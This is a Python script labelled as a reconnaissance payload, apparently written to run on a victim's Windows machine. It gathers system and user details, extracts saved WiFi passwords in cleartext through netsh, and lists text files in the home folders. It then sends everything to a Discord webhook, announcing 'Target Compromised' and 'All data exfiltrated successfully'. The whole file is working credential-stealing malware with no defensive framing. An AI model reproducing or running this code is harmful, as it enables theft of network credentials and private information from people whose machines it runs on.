#!/usr/bin/env python3
"""
ALL-IN-ONE Reconnaissance Payload
Gathers system info, WiFi passwords, and file listings
Sends everything to Discord webhook
"""

import os
import sys
import platform
import socket
import subprocess
from datetime import datetime
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False
    print("⚠️  webhook_utils not found - data will only be printed locally")

def gather_system_info():
    """Gather basic system information"""
    try:
        return {
            'hostname': socket.gethostname(),
            'username': os.getlogin(),
            'system': platform.system(),
            'release': platform.release(),
            'machine': platform.machine(),
            'ip': socket.gethostbyname(socket.gethostname())
        }
    except:
        return {'error': 'Failed to gather system info'}

def get_wifi_passwords():
    """Get WiFi passwords (Windows)"""
    try:
        profiles_data = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'],
            encoding='utf-8',
            errors='ignore'
        )
        
        wifi_list = []
        profiles = [line.split(':')[1].strip() 
                   for line in profiles_data.split('\n') 
                   if 'All User Profile' in line]
        
        for profile in profiles[:10]:  # Limit to 10
            try:
                profile_info = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    encoding='utf-8',
                    errors='ignore'
                )
                
                password = None
                for line in profile_info.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        break
                
                if password:
                    wifi_list.append(f"{profile}: {password}")
                
            except:
                continue
        
        return wifi_list
    except:
        return []

def scan_interesting_files():
    """Find interesting files in common locations"""
    interesting = []
    
    search_locations = [
        Path.home() / "Desktop",
        Path.home() / "Documents",
        Path.home() / "Downloads"
    ]
    
    for location in search_locations:
        if not location.exists():
            continue
        
        try:
            for file in location.glob("*.txt"):
                interesting.append(str(file.name))
                if len(interesting) >= 20:
                    return interesting
        except:
            continue
    
    return interesting

def main():
    print("=" * 60)
    print("ALL-IN-ONE RECONNAISSANCE PAYLOAD")
    print("=" * 60)
    print(f"\nStarted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # Gather all data
    print("[1/3] Gathering system information...")
    sys_info = gather_system_info()
    
    print("[2/3] Extracting WiFi passwords...")
    wifi_data = get_wifi_passwords()
    
    print("[3/3] Scanning for interesting files...")
    files = scan_interesting_files()
    
    print("\n" + "=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)
    
    # Display results
    print("\n📊 SYSTEM INFO:")
    for key, value in sys_info.items():
        print(f"  {key}: {value}")
    
    print(f"\n📡 WIFI NETWORKS: {len(wifi_data)} found")
    for wifi in wifi_data[:5]:
        print(f"  • {wifi}")
    if len(wifi_data) > 5:
        print(f"  ... and {len(wifi_data) - 5} more")
    
    print(f"\n📁 INTERESTING FILES: {len(files)} found")
    for file in files[:10]:
        print(f"  • {file}")
    if len(files) > 10:
        print(f"  ... and {len(files) - 10} more")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n" + "=" * 60)
        print("EXFILTRATING DATA TO DISCORD")
        print("=" * 60)
        
        # Send system info
        print("\n[1/3] Sending system information...")
        sys_message = f"""**System Reconnaissance Complete**

🖥️ **System:** {sys_info.get('system', 'Unknown')} {sys_info.get('release', '')}
📍 **Hostname:** {sys_info.get('hostname', 'Unknown')}
👤 **Username:** {sys_info.get('username', 'Unknown')}
🌐 **IP:** {sys_info.get('ip', 'Unknown')}
💻 **Machine:** {sys_info.get('machine', 'Unknown')}
⏰ **Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        send_to_discord("🎯 Target Compromised", sys_message)
        
        # Send WiFi data
        if wifi_data:
            print("[2/3] Sending WiFi credentials...")
            wifi_message = f"**Found {len(wifi_data)} WiFi networks:**\n\n"
            for wifi in wifi_data[:10]:
                wifi_message += f"📡 `{wifi}`\n"
            send_to_discord("🔐 WiFi Credentials", wifi_message)
        
        # Send file list
        if files:
            print("[3/3] Sending file list...")
            files_message = f"**Found {len(files)} interesting files:**\n\n"
            for file in files[:15]:
                files_message += f"📄 {file}\n"
            send_to_discord("📁 File Discovery", files_message)
        
        print("\n✓ All data exfiltrated successfully!")
    
    print("\n" + "=" * 60)
    print("MISSION COMPLETE")
    print("=" * 60)

if __name__ == "__main__":
    main()
